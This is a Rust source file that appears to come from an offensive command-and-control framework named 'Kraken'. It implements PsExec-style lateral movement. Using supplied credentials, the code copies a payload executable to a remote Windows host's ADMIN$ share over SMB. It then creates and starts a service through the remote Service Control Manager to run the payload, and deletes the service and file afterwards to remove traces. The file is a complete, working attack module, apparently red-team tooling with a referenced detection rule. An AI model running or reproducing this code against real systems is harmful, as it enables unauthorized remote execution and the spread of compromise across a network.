//! PSExec-style lateral movement via SMB + Windows Service Control Manager
//!
//! Technique:
//! 1. Connect to ADMIN$ share via WNetAddConnection2W
//! 2. Copy payload binary to \\target\ADMIN$\<service_name>.exe
//! 3. Open SCM on remote host via OpenSCManagerW
//! 4. Create service pointing at the dropped binary
//! 5. Start service
//! 6. Wait briefly for execution
//! 7. Delete service and remove payload file
//!
//! Detection rules: wiki/detection/sigma/kraken_lateral_psexec.yml

use common::{KrakenError, LateralResult};
use protocol::LateralPsexec;
#[cfg(windows)]
use tracing::{debug, warn};

pub fn execute(task: &LateralPsexec) -> Result<LateralResult, KrakenError> {
    #[cfg(windows)]
    return execute_impl(task);

    #[cfg(not(windows))]
    {
        let _ = task;
        Err(KrakenError::Module(
            "psexec lateral movement only supported on Windows".into(),
        ))
    }
}

#[cfg(windows)]
fn execute_impl(task: &LateralPsexec) -> Result<LateralResult, KrakenError> {
    use crate::smb;
    use std::ffi::OsStr;
    use std::iter::once;
    use std::os::windows::ffi::OsStrExt;
    use windows_sys::Win32::System::Services::{
        CloseServiceHandle, CreateServiceW, DeleteService, OpenSCManagerW, StartServiceW,
        SC_MANAGER_CREATE_SERVICE, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
        SERVICE_WIN32_OWN_PROCESS,
    };

    fn wide(s: &str) -> Vec<u16> {
        OsStr::new(s).encode_wide().chain(once(0)).collect()
    }

    let target = &task.target;
    let service_name = &task.service_name;
    let filename = format!("{}.exe", service_name);

    debug!("psexec: copying payload to \\\\{}\\ADMIN$\\{}", target, filename);

    // Step 1-2: Copy payload to ADMIN$
    let copy_result = smb::copy_to_share(
        target,
        "ADMIN$",
        &filename,
        &task.payload,
        task.username.as_deref(),
        task.password.as_deref(),
        task.domain.as_deref(),
    )?;

    debug!("psexec: payload written to {}", copy_result.remote_path);

    // Step 3: Open SCM on remote host
    let scm_host = format!("\\\\{}", target);
    let scm_wide = wide(&scm_host);

    let scm = unsafe {
        OpenSCManagerW(
            scm_wide.as_ptr(),
            std::ptr::null(),
            SC_MANAGER_CREATE_SERVICE,
        )
    };

    if scm == 0 {
        let err = unsafe { windows_sys::Win32::Foundation::GetLastError() };
        smb::delete_remote_file(target, "ADMIN$", &filename);
        smb::disconnect_share(target, "ADMIN$");
        return Err(KrakenError::Module(format!(
            "OpenSCManagerW on {} failed: {}",
            target, err
        )));
    }

    // Binary path as seen from the remote host: %SystemRoot%\<filename>
    let bin_path = format!("%SystemRoot%\\{}", filename);
    let svc_name_wide = wide(service_name);
    let bin_path_wide = wide(&bin_path);

    // Step 4: Create service
    let svc = unsafe {
        CreateServiceW(
            scm,
            svc_name_wide.as_ptr(),
            svc_name_wide.as_ptr(),
            windows_sys::Win32::System::Services::SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_NORMAL,
            bin_path_wide.as_ptr(),
            std::ptr::null(),
            std::ptr::null_mut(),
            std::ptr::null(),
            std::ptr::null(),
            std::ptr::null(),
        )
    };

    if svc == 0 {
        let err = unsafe { windows_sys::Win32::Foundation::GetLastError() };
        unsafe { CloseServiceHandle(scm) };
        smb::delete_remote_file(target, "ADMIN$", &filename);
        smb::disconnect_share(target, "ADMIN$");
        return Err(KrakenError::Module(format!(
            "CreateServiceW failed: {}",
            err
        )));
    }

    // Step 5: Start service
    let start_ok = unsafe { StartServiceW(svc, 0, std::ptr::null()) };
    if start_ok == 0 {
        let err = unsafe { windows_sys::Win32::Foundation::GetLastError() };
        warn!("psexec: StartServiceW failed: {} (may have executed and exited)", err);
        // 1053 = service did not respond in timely manner — often means it ran and exited
        if err != 1053 {
            unsafe {
                DeleteService(svc);
                CloseServiceHandle(svc);
                CloseServiceHandle(scm);
            }
            smb::delete_remote_file(target, "ADMIN$", &filename);
            smb::disconnect_share(target, "ADMIN$");
            return Ok(LateralResult {
                success: false,
                target: target.clone(),
                method: "psexec".into(),
                output: String::new(),
                error: format!("StartServiceW error {}", err),
            });
        }
    }

    // Step 6: Brief wait for execution (service may be very short-lived)
    std::thread::sleep(std::time::Duration::from_millis(500));

    // Step 7: Delete service and cleanup
    unsafe {
        DeleteService(svc);
        CloseServiceHandle(svc);
        CloseServiceHandle(scm);
    }
    smb::delete_remote_file(target, "ADMIN$", &filename);
    smb::disconnect_share(target, "ADMIN$");

    Ok(LateralResult {
        success: true,
        target: target.clone(),
        method: "psexec".into(),
        output: format!("payload executed via service {} on {}", service_name, target),
        error: String::new(),
    })
}
